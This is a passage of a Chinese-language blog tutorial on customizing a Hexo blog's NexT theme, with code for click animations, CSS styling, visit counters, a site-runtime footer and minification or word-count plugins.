class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">"sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"toggle-sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"A"</span>!==e.target.nodeName&amp;&amp;<span class="string">"IMG"</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">"resize"</span>,setCanvasSize,!<span class="number">1</span>)&#125;;</span><br></pre></td></tr></table></figure><p>　　然后在<code>H:/blog/themes/next/layout/_layout.swig</code>文件中，<code>&lt;/head&gt;</code>之前加入以下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 爆炸红心效果 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">class</span>=<span class="string">"fireworks"</span> <span class="attr">style</span>=<span class="string">"position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"</span> &gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/animejs/2.2.0/anime.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/src/yanhuatexiao.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/ccfc6699.html/%E9%BC%A0%E6%A0%87%E7%89%B9%E6%95%88%E4%BB%A3%E7%A0%81.png" alt></p><p>　　还可以换成点击出现爱心的特效,方法是一样的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">"left:"</span>+d[e].x+<span class="string">"px;top:"</span>+d[e].y+<span class="string">"px;opacity:"</span>+d[e].alpha+<span class="string">";transform:scale("</span>+d[e].scale+<span class="string">","</span>+d[e].scale+<span class="string">") rotate(45deg);background:"</span>+d[e].color+<span class="string">";z-index:99999"</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">"function"</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.οnclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">"div"</span>);a.className=<span class="string">"heart"</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX<span class="number">-5</span>,<span class="attr">y</span>:e.clientY<span class="number">-5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">"style"</span>);a.type=<span class="string">"text/css"</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">"rgb("</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">")"</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;setTimeout(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><h4 id="修改超链接的颜色"><a href="#修改超链接的颜色" class="headerlink" title="修改超链接的颜色"></a>修改超链接的颜色</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E8%B6%85%E9%93%BE%E6%8E%A5%E6%BC%94%E7%A4%BA.gif" alt></p><p>实现方法</p><p>　　打开<code>H:\blog\themes\next\source\css\_common\components\post</code>文件夹下的<code>post.styl</code>,添加以下css样式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　其中选择<code>.post-body</code> 是为了不影响标题，选择 <code>p</code> 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。</p><h4 id="文章结尾添加结束标记"><a href="#文章结尾添加结束标记" class="headerlink" title="文章结尾添加结束标记"></a>文章结尾添加结束标记</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E9%98%85%E8%AF%BB%E7%BB%93%E6%9D%9F%E6%A0%87%E5%BF%97.png" alt></p><p>实现方法</p><p>　　打开<code>H:/blog/themes/next/layout/_macro</code>文件夹，新建<code>passage-end-tag.swig</code> 文件,并添加以下内容：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;</span>-------------本文结束<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-paw"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>感谢您的阅读-------------<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>　　然后打开<code>H:/blog/themes/next/layout/_macro/post.swig</code>文件，在<code>post-body</code> 之后， <code>post-footer</code> 之前添加以下代码：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'passage-end-tag.swig' %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/posts/ccfc6699.html/%E9%98%85%E8%AF%BB%E7%BB%93%E6%9D%9F%E6%A0%87%E5%BF%97%E4%BB%A3%E7%A0%81.png" alt></p><p>　　接着在<code>H:/blog/themes/next/_config.yml</code>末尾添加：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line"><span class="attr">  enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="修改文章底部带-号的标签"><a href="#修改文章底部带-号的标签" class="headerlink" title="修改文章底部带#号的标签"></a>修改文章底部带#号的标签</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E5%B8%A6#%E6%A0%87%E7%AD%BE.png" alt></p><p>实现方法</p><p>　　修改<code>H:/blog/themes/next/layout/_macro/post.swig</code>，搜索 <code>rel=&quot;tag&quot;&gt;#</code>，将 # 换成<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p><p><img src="/posts/ccfc6699.html/%E5%B8%A6#%E6%A0%87%E7%AD%BE%E4%BB%A3%E7%A0%81.png" alt></p><h4 id="设置博客头像并旋转"><a href="#设置博客头像并旋转" class="headerlink" title="设置博客头像并旋转"></a>设置博客头像并旋转</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E5%A4%B4%E5%83%8F%E6%97%8B%E8%BD%AC%E6%BC%94%E7%A4%BA.gif" alt></p><p>实现方法</p><p>　　打开<code>H:/blog/themes/next/source/images</code>,把头像放到该目录下，然后打开<code>H:/blog/_config.yml</code>,找到<code>avatar:</code>，修改为以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># In theme directory (source/images): /images/avatar.gif</span></span><br><span class="line">  <span class="comment"># In site directory (source/uploads): /uploads/avatar.gif</span></span><br><span class="line">  <span class="comment"># You can also use other linking images.</span></span><br><span class="line"><span class="attr">  url:</span> <span class="string">/images/avatar.gif</span></span><br><span class="line">  <span class="comment"># If true, the avatar would be dispalyed in circle.</span></span><br><span class="line"><span class="attr">  rounded:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># The value of opacity should be choose from 0 to 1 to set the opacity of the avatar.</span></span><br><span class="line"><span class="attr">  opacity:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># If true, the avatar would be rotated with the cursor.</span></span><br><span class="line"><span class="attr">  rotated:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="快速实现博客压缩"><a href="#快速实现博客压缩" class="headerlink" title="快速实现博客压缩"></a>快速实现博客压缩</h4><p>　　项目压缩也叫<code>代码丑化</code>, 分别对 html、css、js、images进行优化，即把重复的代码合并，把多余的空格去掉，用算法把 images 进行压缩。压缩后的博客，加载速度会有较大的提升，自然能留住更多游客。</p><p>　　蛮多朋友使用了<code>gulp</code>对博客进行压缩，这也是一个办法，但在社区逛了下，找到了一个比较好用的模块<a href="https://github.com/chenzhutian/hexo-all-minifier" target="_blank" rel="noopener">hexo-all-minifier</a>，这个模块集成了对 html、css、js、image 的优化。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-<span class="keyword">all</span>-minifier <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>　　安装上此模块后，只要在根目录下的_config.yml文件中加上如下字段就可对博客所有内容进行压缩。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">html_minifier:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  ignore_error:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  exclude:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">css_minifier:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  exclude:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">'*.min.css'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">js_minifier:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  mangle:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  output:</span></span><br><span class="line"><span class="attr">  compress:</span></span><br><span class="line"><span class="attr">  exclude:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">'*.min.js'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">image_minifier:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  interlaced:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  multipass:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  optimizationLevel:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">  pngquant:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  progressive:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="侧边栏添加社交图标"><a href="#侧边栏添加社交图标" class="headerlink" title="侧边栏添加社交图标"></a>侧边栏添加社交图标</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E7%A4%BE%E4%BA%A4%E5%B0%8F%E5%9B%BE%E6%A0%87.png" alt></p><p>实现方法</p><p>　　打开主题配置文件<code>_config.yml</code>，搜索<code>social:</code>,在<a href="http://fontawesome.io/icons/" target="_blank" rel="noopener">图标库</a>找自己喜欢的小图标，并将名字复制在如下位置，保存即可</p><p><img src="/posts/ccfc6699.html/%E7%A4%BE%E4%BA%A4%E5%B0%8F%E5%9B%BE%E6%A0%87%E4%BB%A3%E7%A0%81.png" alt></p><h4 id="主页文章添加阴影效果"><a href="#主页文章添加阴影效果" class="headerlink" title="主页文章添加阴影效果"></a>主页文章添加阴影效果</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E5%9B%BE.png" alt></p><p>实现方法</p><p>　　打开<code>H:\blog\themes\next\source\css\_common\components\post</code>文件夹下的<code>post.styl</code>,添加以下css样式：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主页文章添加阴影效果</span></span><br><span class="line"> <span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">0px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">202</span>, <span class="number">203</span>, <span class="number">203</span>, .<span class="number">5</span>);</span><br><span class="line">   -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, .<span class="number">5</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="在博客底部添加访问量"><a href="#在博客底部添加访问量" class="headerlink" title="在博客底部添加访问量"></a>在博客底部添加访问量</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E5%BA%95%E9%83%A8%E8%AE%BF%E9%97%AE%E9%87%8F.png" alt></p><p>实现方法</p><p>　　打开<code>H:/blog/themes/next/_config.yml</code>,找到<code>busuanzi</code>，修改为以下参数：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  total_visitors: <span class="literal">true</span></span><br><span class="line">  total_visitors_icon: user</span><br><span class="line">  total_views: <span class="literal">true</span></span><br><span class="line">  total_views_icon: eye</span><br></pre></td></tr></table></figure><h4 id="使用leancloud统计页面访问次数"><a href="#使用leancloud统计页面访问次数" class="headerlink" title="使用leancloud统计页面访问次数"></a>使用leancloud统计页面访问次数</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E7%83%AD%E5%BA%A6.png" alt></p><p>实现方法</p><p>　　主题集成了leancloud，但是我们还需要去<a href="https://leancloud.cn/" target="_blank" rel="noopener">官网</a>注册账号并实名，这里讲一下关键的步骤。</p><h5 id="配置leancloud"><a href="#配置leancloud" class="headerlink" title="配置leancloud"></a>配置leancloud</h5><ul><li>创建应用：<code>控制台 --&gt; 创建应用（开发版）</code></li></ul><p>应用名称可以随意输入，后面还可以修改，我的是blog</p><ul><li>创建class：</li></ul><p>　　点击刚创建的应用，创建一个 Class 表用来保存我们的博客访问数据。此处创建的 Class 名字必须为 <code>Counter</code>，ACL 权限选择 <code>无限制</code>。</p><ul><li>创建 Class 完成之后，新创建的 Counter 表会显示在左侧，这时再切换到 test 应用的 <code>设置 - 应用 Key</code> 界面：</li></ul><p><img src="/posts/ccfc6699.html/leancloud%E8%AE%BE%E7%BD%AE.png" alt></p><ul><li>复制ID和Key</li></ul><p><img src="/posts/ccfc6699.html/leanleancloud%E8%AE%BE%E7%BD%AEkey.png" alt></p><h5 id="启用leancloud"><a href="#启用leancloud" class="headerlink" title="启用leancloud"></a>启用leancloud</h5><p>　　打开<code>_config.yml</code>主题配置文件，找到<code>leancloud_visitors:</code>,填入id和key。</p><p><img src="/posts/ccfc6699.html/leanleancloud%E8%AE%BE%E7%BD%AEkey%E4%BB%A3%E7%A0%81.png" alt></p><h5 id="修改热度"><a href="#修改热度" class="headerlink" title="修改热度"></a>修改热度</h5><p>　　打开<code>H:/blog/themes/next/layout/_macro/post.swig</code>文件，找到<code>leancloud</code>,修改成如下代码：</p><p><img src="/posts/ccfc6699.html/%E7%83%AD%E5%BA%A6%E4%BB%A3%E7%A0%81.png" alt></p><p>　　最后打开<code>H:/blog/themes/next/languages/zh-CN.yml</code>,把views参数改成如下：</p><p><img src="/posts/ccfc6699.html/%E7%83%AD%E5%BA%A6%E8%AE%BE%E7%BD%AE.png" alt></p><h4 id="博客标题设置"><a href="#博客标题设置" class="headerlink" title="博客标题设置"></a>博客标题设置</h4><p>　　这个相关的设置在<code>H:/blog/_config.yml</code>中修改，如下图所示：</p><p><img src="/posts/ccfc6699.html/%E5%8D%9A%E5%AE%A2%E6%A0%87%E9%A2%98%E8%AE%BE%E7%BD%AE.png" alt></p><h4 id="博客底部添加网站的运行时间"><a href="#博客底部添加网站的运行时间" class="headerlink" title="博客底部添加网站的运行时间"></a>博客底部添加网站的运行时间</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E5%BA%95%E9%83%A8%E8%AE%BF%E9%97%AE%E9%87%8F.png" alt></p><p>实现方法</p><p>　　打开<code>H:/blog/themes/next/layout/_partials/footer.swig</code>，在末尾添加如下代码;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 网站运行时间的设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"timeDate"</span>&gt;</span>载入天数...<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"times"</span>&gt;</span>载入时分秒...<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">createtime</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> grt= <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">"07/12/2019 18:30:00"</span>);<span class="comment">//此处修改你的建站时间或者网站上线时间</span></span></span><br><span class="line">        now.setTime(now.getTime()+250);</span><br><span class="line"><span class="javascript">        days = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>; dnum = <span class="built_in">Math</span>.floor(days);</span></span><br><span class="line"><span class="javascript">        hours = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> - (<span class="number">24</span> * dnum); hnum = <span class="built_in">Math</span>.floor(hours);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(<span class="built_in">String</span>(hnum).length ==<span class="number">1</span> )&#123;hnum = <span class="string">"0"</span> + hnum;&#125; minutes = (now - grt ) / <span class="number">1000</span> /<span class="number">60</span> - (<span class="number">24</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * hnum);</span></span><br><span class="line"><span class="javascript">        mnum = <span class="built_in">Math</span>.floor(minutes); <span class="keyword">if</span>(<span class="built_in">String</span>(mnum).length ==<span class="number">1</span> )&#123;mnum = <span class="string">"0"</span> + mnum;&#125;</span></span><br><span class="line">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);</span><br><span class="line"><span class="javascript">        snum = <span class="built_in">Math</span>.round(seconds); <span class="keyword">if</span>(<span class="built_in">String</span>(snum).length ==<span class="number">1</span> )&#123;snum = <span class="string">"0"</span> + snum;&#125;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"timeDate"</span>).innerHTML = <span class="string">"网站已运行 "</span>+dnum+<span class="string">" 天 "</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"times"</span>).innerHTML = hnum + <span class="string">" 小时 "</span> + mnum + <span class="string">" 分 "</span> + snum + <span class="string">" 秒"</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">setInterval(<span class="string">"createtime()"</span>,<span class="number">250</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="添加-README-md-文件"><a href="#添加-README-md-文件" class="headerlink" title="添加 README.md 文件"></a>添加 README.md 文件</h4><p>　　每个项目下一般都有一个 <code>README.md</code> 文件，但是使用 hexo 部署到仓库后，项目下是没有 <code>README.md</code> 文件的。</p><p>　　在 Hexo 目录下的 <code>source</code> 根目录下添加一个 <code>README.md</code> 文件，修改站点配置文件 _<code>config.yml</code>，将 <code>skip_render</code> 参数的值设置为<code>skip_render: README.md</code></p><p>　　保存退出即可。再次使用 <code>hexo d</code> 命令部署博客的时候就不会在渲染 README.md 这个文件了。</p><h4 id="自定义网站的图标"><a href="#自定义网站的图标" class="headerlink" title="自定义网站的图标"></a>自定义网站的图标</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png" alt></p><p>实现方法</p><p>　　我的图标是在<a href="https://www.iconfont.cn/" target="_blank" rel="noopener">阿里矢量图标库</a>下载的，你也可以在其他地方下载或者制作，然后把图标放在<code>H：/blog/themes/next/source/images</code>里面，斌且修改主题配置文件：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">favicon:</span></span><br><span class="line"><span class="symbol">  small:</span> <span class="meta-keyword">/images/</span>favicon<span class="number">-16</span>x16-next.png</span><br><span class="line"><span class="symbol">  medium:</span> <span class="meta-keyword">/images/</span>favicon<span class="number">-32</span>x32-next.png</span><br><span class="line"><span class="symbol">  apple_touch_icon:</span> <span class="meta-keyword">/images/</span>apple-touch-icon-next.png</span><br><span class="line"><span class="symbol">  safari_pinned_tab:</span> <span class="meta-keyword">/images/</span>logo.svg</span><br><span class="line">  <span class="meta">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="meta">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure><h4 id="文章字数、阅读时长统计"><a href="#文章字数、阅读时长统计" class="headerlink" title="文章字数、阅读时长统计"></a>文章字数、阅读时长统计</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E7%83%AD%E5%BA%A6.png" alt></p><p>实现效果</p><p>　　打开博客根目录，运行以下命令，安装插件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-symbols-<span class="keyword">count</span>-<span class="built_in">time</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>　　然后修改博客配置文件，在末尾添加以下代码：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line"><span class="attr">  symbols:</span> <span class="literal">true</span>                <span class="comment"># 文章字数统计</span></span><br><span class="line"><span class="attr">  time:</span> <span class="literal">true</span>                   <span class="comment"># 文章阅读时长</span></span><br><span class="line"><span class="attr">  total_symbols:</span> <span class="literal">true</span>          <span class="comment"># 站点总字数统计</span></span><br><span class="line"><span class="attr">  total_time:</span> <span class="literal">true</span>             <span class="comment"># 站点总阅读时长</span></span><br><span class="line"><span class="attr">  exclude_codeblock:</span> <span class="literal">false</span>     <span class="comment"># 排除代码字数统计</span></span><br></pre></td></tr></table></figure><p>　　最后在主题配置文件里面，找到<code>symbols_count_time</code>,修改成以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line"><span class="attr">  separated_meta:</span> <span class="literal">true</span>     <span class="comment"># 是否另起一行（true的话不和发表时间等同一行）</span></span><br><span class="line"><span class="attr">  item_text_post:</span> <span class="literal">true</span>     <span class="comment"># 首页文章统计数量前是否显示文字描述（本文字数、阅读时长）</span></span><br><span class="line"><span class="attr">  item_text_total:</span> <span class="literal">true</span>    <span class="comment"># 页面底部统计数量前是否显示文字描述（站点总字数、站点阅读时长）</span></span><br><span class="line"><span class="attr">  awl:</span> <span 